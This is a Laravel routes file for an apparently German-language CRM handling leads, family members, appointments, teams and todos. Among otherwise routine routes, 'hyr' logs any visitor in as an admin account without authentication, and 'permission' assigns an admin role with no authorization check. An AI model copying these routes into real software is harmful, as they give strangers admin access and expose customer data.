<?php
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\CalendarController;
use App\Http\Controllers\UserController;
use App\Http\Middleware\confirmcode;
use App\Http\Middleware\confirmedadmin;
use App\Http\Middleware\confirmedcode;
use App\Mail\confirmcode as MailConfirmcode;
use Carbon\Carbon;
use App\Http\Controllers\TasksController;
use Illuminate\Foundation\Auth\User;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ChatController;
use App\Http\Controllers\TodoController;
use App\Models\Admins;
use App\Models\todo;
use App\Models\family;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use App\Http\Controllers\FamilyPersonsController;
use App\Http\Controllers\LeadDataController;
use App\Http\Controllers\StatusController;
use App\Http\Controllers\TeamController;
use App\Models\lead;
use Illuminate\Http\Request;
use Illuminate\Contracts\Session\Session;
use Musonza\Chat\Chat;
use Illuminate\Support\Facades\Storage;






route::prefix('')->group(function(){

// =====================================
   route::get('hyr',function(){
      Auth::guard('admins')->loginUsingId(6);
   });
//==========================================
   route::get('acceptapp/{id}',[UserController::class,'acceptapp']);
    route::get('closenots',[UserController::class,'closenots']);
    route::get('notifications',[UserController::class,'notifications']);
    route::get('insterappointment',[UserController::class,'insertappointment'])->name('insertappointment');
    route::get('/',[UserController::class,'dashboard'])->name('dashboard');
    route::get('leads',[UserController::class,'leads'])->name('leads');
    route::post('asignlead/{id}',[UserController::class,'asignlead'])->name('asignlead');
    route::get('alead/{id}',[UserController::class,'alead'])->name('alead');
    route::post('joined',[UserController::class,'joined'])->name('joined');
    route::get('dlead/{id}',[UserController::class,'dlead'])->name('dlead');

    Route::group(['middleware' => 'json.response'], function () {
      route::post('deletedlead/{id}',[UserController::class,'deletedlead'])->name('deletedlead');
   });

    route::post('addappointment',[UserController::class,'addappointment'])->name('addappointment')->middleware('role:admin|fs|backoffice,admins');
    route::get('dealclosed/{id}',[UserController::class,'dealclosed'])->name('dealclosed');

    Route::group(['middleware' => 'json.response'], function () {
      route::post('completeapp/{id}',[UserController::class,'completeapp'])->name('completeapp');
   });

    route::get('dealnotclosed/{id}',[UserController::class,'dealnotclosed'])->name('dealnotclosed');
    route::post('rejectedleads',[UserController::class,'rejectedleads'])->name('rejectedleads');
    route::get('addnewuser',[UserController::class,'addnewuser'])->name('addnewuser');
    route::post('registernewuser',[UserController::class,'registernewuser'])->name('registernewuser');
    route::get('acceptappointment/{id}',function ($id){
        $lead = lead::find($id);

        return view('acceptappointment',compact('lead'));
    })->name('acceptappointment');
    route::get('acceptleadinfo/{id}',function ($id){
        $idd = Crypt::decrypt($id);
        $idd /= 1244;
        $app = lead::find($idd)->update(['assigned' => 1]);
        return redirect()->back();
    })->name('acceptleadinfo');

    //----------------------------------------------------------------//
    route::get('leadfamily/{id}',function ($id){
      try
      {$data = family::where('leads_id',$id)->get();
                     if(!empty($data[0])){
                        if (Auth::guard('admins')->user()->hasRole('admin') || Auth::guard('admins')->user()->hasRole('backoffice') || $data[0]->lead->assign_to_id == Auth::guard('admins')->user()->id) {return view('leadfamily',compact('data'));}
                     }
                     else{
                        return redirect()->route('dealclosed',$id);
                     }

                  }
      catch(Throwable $e){
          return redirect()->back();
      }

   })->name('leadfamily');
   route::get('leadfamilyperson/{id}',[FamilyPersonsController::class,'family_persons'])->name('leadfamilyperson');
    route::post('updateleadfamilyperson/{id}',[FamilyPersonsController::class,'updateleadfamilyperson'])->name('updateleadfamilyperson');
    route::get('allFamilyPersons/{id}',[FamilyPersonsController::class,'getAllFamilyPersonsOfLead'])->name('allFamilyPersonOfLead');
    route::post('updateFamilyPerson/{id}',[FamilyPersonsController::class,'updateFamilyPerson'])->name('updateFamilyPerson');
    route::post('deleteFamilyPerson/{id}/{leadId}',[FamilyPersonsController::class,'deleteFamilyPerson'])->name('deleteFamilyPerson');
    route::post('createLeadDataKK/{leadId}/{personId}',[LeadDataController::class,'createLeadDataKK'])->name('createLeadDataKK');
    route::post('updateLeadDataKK/{leadId}/{personId}',[LeadDataController::class,'updateLeadDataKK'])->name('updateLeadDataKK');
    route::post('updateleadDataACounteroffered/{leadId}/{personId}',[LeadDataController::class,'updateleadDataACounteroffered'])->name('updateleadDataACounteroffered');
    route::post('updateLeadDataFahrzeug/{leadId}/{personId}',[LeadDataController::class,'updateLeadDataFahrzeug'])->name('updateLeadDataFahrzeug');
    route::post('updateLeadDataThings/{leadId}/{personId}',[LeadDataController::class,'updateLeadDataThings'])->name('updateLeadDataThings');
    route::post('createLeadDataPrevention/{leadId}/{personId}',[LeadDataController::class,'createLeadDataPrevention'])->name('createLeadDataPrevention');
    route::get('getAllLeadDataById/{leadId}/{personId}',[LeadDataController::class,'getAllLeadDataById'])->name('getAllLeadDataById');
    route::post('deleteLeadDataKK/{dataId}',[LeadDataController::class,'deleteLeadDataKK'])->name('deleteLeadDataKK');
    route::post('deleteLeadDataCounteroffered/{dataId}',[LeadDataController::class,'deleteLeadDataCounteroffered'])->name('deleteLeadDataCounteroffered');
    route::post('deleteLeadDataFahrzeug/{dataId}',[LeadDataController::class,'deleteLeadDataFahrzeug'])->name('deleteLeadDataFahrzeug');
    route::post('deleteLeadDataThings/{dataId}',[LeadDataController::class,'deleteLeadDataThings'])->name('deleteLeadDataThings');
    route::post('deleteLeadDataPrevention/{dataId}',[LeadDataController::class,'deleteLeadDataPrevention'])->name('deleteLeadDataPrevention');
    route::post('deleteTeam/{teamId}',[TeamController::class,'deleteTeam'])->name('deleteTeam');
    route::get('showTeamById/{teamId}',[TeamController::class,'showTeamById'])->name('showTeamById');
    route::get('updateTeam/{teamId}',[TeamController::class,'updateTeam'])->name('updateTeam');
    Route::group(['prefix' => 'team', 'middleware' => 'json.response'], function () {
      route::post('create',[TeamController::class,'createTeam'])->name('createTeam');
  });
   route::post('documentform/{id}',[TasksController::class,'documentform'])->name('documentform');
   route::any('tasks',[TasksController::class,'tasks'])->name('tasks');
   route::get('searchword',[TasksController::class,'searchword'])->name('searchword');
   route::any('costumers',[TasksController::class,'costumers'])->name('costumers');
   route::any('search',[TasksController::class,'costumers'])->name('search');
   route::get('ispending',[TasksController::class,'itis']);
   route::get('todayappointments',[TasksController::class,'today']);
   route::get('vuedate',[TasksController::class,'vuedate']);
   route::get('chat',[ChatController::class,'chat']);
   route::get('leadfamilyperson/{id}',[FamilyPersonsController::class,'family_persons'])->name('leadfamilyperson');
   route::any('addappointmentfile',[UserController::class,'addappointmentfile'])->name('addappointmentfile');
   Route::group(['middleware' => 'json.response'], function () {
      route::get('addtodo',[TodoController::class,'addtodo']);
   });

   route::get('todos',[TodoController::class,'todos']);
   route::get('deletetodo',[TodoController::class,'deletetodo']);
   route::get('donetodo',[TodoController::class,'donetodo']);
   route::get('addnumber',[TodoController::class,'addnumber']);
   route::get('deletenumber',[TodoController::class,'deletenumber']);
   route::get('numbers',[TodoController::class,'numbers']);
   route::get('calendar',[CalendarController::class,'calendar'])->name('calendar')->middleware('role:admin|fs|salesmanager|management,admins');
   route::get('accepttask/{id}',[TasksController::class,'accepttask'])->name('accepttask');
   route::get('dates',[TasksController::class,'dates'])->name('dates');

route::get('assignpendency/{admin}/{id}/{desc}',[TasksController::class,'assignpendency']);

   route::post('confirmsms',[TasksController::class,'confirmsms'])->name('confirmsms');
   route::get('add',[TasksController::class,'adddata']);
route::get('permission', function(){
   $role = Role::find(2);
   $user = Admins::find(2);
   $user->assignRole($role);
  return $user->getRoleNames();
});
Route::get('login',[UserController::class,'rnlogin'])->name('rnlogin')->withoutMiddleware([confirmedcode::class]);
route::post('trylogin',[UserController::class,'trylogin'])->name('trylogin')->withoutMiddleware([confirmedcode::class]);
route::any('acceptdata/{id}/{accept?}',[LeadDataController::class,'acceptdata'])->name('acceptdata');
route::get('smsverification',[UserController::class,'smsconfirmation'])->name('smsconfirmation')->withoutMiddleware([confirmedcode::class]);
route::get('smsconfirm',function (){
    $Admin = Admins::find(12);
    return view('confirm_sms');
})->name('smsconfirm')->withoutMiddleware([confirmedcode::class]);
route::post('confirmcode',[UserController::class,'confirmcode'])->name('confirmcode')->withoutMiddleware([confirmedcode::class]);
route::get('logout',[UserController::class,'logout'])->name('logout')->withoutMiddleware([confirmedcode::class]);
route::get('status',[StatusController::class,'status'])->name('status');
route::get('editclientdata/{id}',[StatusController::class,'editclientdata'])->name('editclientdata');
route::post('editclientform/{id}',[StatusController::class,'editclientform'])->name('editclientform');
route::get('file/{file?}',function($file = null){
        if(Storage::disk('img')->exists($file)){
           $file = Storage::disk('img')->get($file);
           $response = Response::make($file, 200);
         $response->header('Content-Type', 'image/jpg');
           return $response;
        }
        else{
           return redirect()->back();
        }
})->middleware('role:admin|backoffice|salesmanager|management,admins')->name('showfile');
});

// Route::get('Appointments', array('as' => 'route.index', 'Appointments' => 'App\Http\Controllers\AppointmentsController@index'));
// route::get('Appointments',[AppointmentsController::class,'Appointments']);

Route::get('Appointments', 'App\Http\Controllers\AppointmentsController@index')->name('Appointments');
Route::get('Dropajax', 'App\Http\Controllers\AppointmentsController@Dropajax')->name('Dropajax');

route::get('sendcode',function(){
                \Mail::to('bulzart@outlook.com')->send(new \App\Mail\confirmcode(random_int(1000,10000)));

});
